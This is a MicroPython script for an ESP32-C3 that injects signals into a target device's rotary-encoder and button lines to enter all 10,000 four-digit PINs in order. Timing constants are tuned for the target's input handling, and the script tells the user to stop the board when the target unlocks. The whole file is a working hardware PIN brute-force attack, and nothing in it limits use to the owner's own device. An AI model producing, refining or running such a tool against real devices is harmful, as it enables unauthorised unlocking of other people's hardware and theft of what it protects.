"""Four-digit PIN entry on an ESP32-C3 running MicroPython.

Wiring matches encoder_bruteforce.ino:
  GPIO4 -> encoder A / RP2040 GPIO27
  GPIO5 -> encoder B / RP2040 GPIO29
  GPIO6 -> encoder button / RP2040 GPIO28
  GND   -> target GND

OPEN_DRAIN outputs either pull LOW or release the line. They never drive HIGH.
The target must provide the HIGH level through its own pull-ups.
"""

from machine import Pin
from time import sleep_ms


PIN_ENCODER_A = 4
PIN_ENCODER_B = 5
PIN_ENCODER_SW = 6

# Full four-digit search. For a short validation run, narrow these bounds.
FIRST_ATTEMPT = 0
LAST_ATTEMPT = 9999

START_DELAY_MS = 2000
PHASE_DELAY_MS = 8
BETWEEN_DETENTS_MS = 82
BEFORE_BUTTON_MS = 15
BUTTON_DOWN_MS = 15
BUTTON_RELEASE_MS = 35
AFTER_ATTEMPT_MS = 1360


def release_line(pin):
    pin.value(1)  # Open drain: high impedance, not driven HIGH.


def pull_low(pin):
    pin.value(0)


def release_all_lines(a, b, sw):
    release_line(a)
    release_line(b)
    release_line(sw)


def rotate_one_step_up(a, b, phase_at_11):
    # One displayed increment is half a quadrature cycle.
    if phase_at_11:
        pull_low(b)       # 11 -> 01
        sleep_ms(PHASE_DELAY_MS)
        pull_low(a)       # 01 -> 00
        next_phase = False
    else:
        release_line(b)   # 00 -> 10
        sleep_ms(PHASE_DELAY_MS)
        release_line(a)   # 10 -> 11
        next_phase = True
    sleep_ms(BETWEEN_DETENTS_MS)
    return next_phase


def rotate_one_step_down(a, b, phase_at_11):
    if phase_at_11:
        pull_low(a)       # 11 -> 10
        sleep_ms(PHASE_DELAY_MS)
        pull_low(b)       # 10 -> 00
        next_phase = False
    else:
        release_line(a)   # 00 -> 01
        sleep_ms(PHASE_DELAY_MS)
        release_line(b)   # 01 -> 11
        next_phase = True
    sleep_ms(BETWEEN_DETENTS_MS)
    return next_phase


def click_encoder(sw):
    pull_low(sw)
    sleep_ms(BUTTON_DOWN_MS)
    release_line(sw)
    sleep_ms(BUTTON_RELEASE_MS)


def enter_digit_from_zero(digit, a, b, sw, phase_at_11):
    # Rotate through the shorter side of the circular 0..9 digit scale.
    if digit <= 5:
        for _ in range(digit):
            phase_at_11 = rotate_one_step_up(a, b, phase_at_11)
    else:
        for _ in range(10 - digit):
            phase_at_11 = rotate_one_step_down(a, b, phase_at_11)

    print("Displayed digit should now be {}; waiting before click".format(digit))
    sleep_ms(BEFORE_BUTTON_MS)
    click_encoder(sw)
    return phase_at_11


def enter_attempt(value, a, b, sw, phase_at_11):
    digits = (value // 1000, (value // 100) % 10, (value // 10) % 10, value % 10)
    print("Trying {:04d}".format(value))
    for digit in digits:
        # The target starts each new displayed position at zero.
        phase_at_11 = enter_digit_from_zero(digit, a, b, sw, phase_at_11)
    return phase_at_11


def main():
    if not (0 <= FIRST_ATTEMPT <= LAST_ATTEMPT <= 9999):
        raise ValueError("PIN range must be within 0000..9999")

    # value=1 releases each open-drain line from the start.
    a = Pin(PIN_ENCODER_A, Pin.OPEN_DRAIN, value=1)
    b = Pin(PIN_ENCODER_B, Pin.OPEN_DRAIN, value=1)
    sw = Pin(PIN_ENCODER_SW, Pin.OPEN_DRAIN, value=1)
    phase_at_11 = True

    try:
        sleep_ms(START_DELAY_MS)
        print("Starting PIN search: {:04d}..{:04d}".format(
            FIRST_ATTEMPT, LAST_ATTEMPT))
        print("Stop the ESP32-C3 manually when the target unlocks.")
        for attempt in range(FIRST_ATTEMPT, LAST_ATTEMPT + 1):
            phase_at_11 = enter_attempt(attempt, a, b, sw, phase_at_11)
            sleep_ms(AFTER_ATTEMPT_MS)
        print("All configured combinations have been attempted.")
    finally:
        release_all_lines(a, b, sw)


if __name__ == "__main__":
    main()
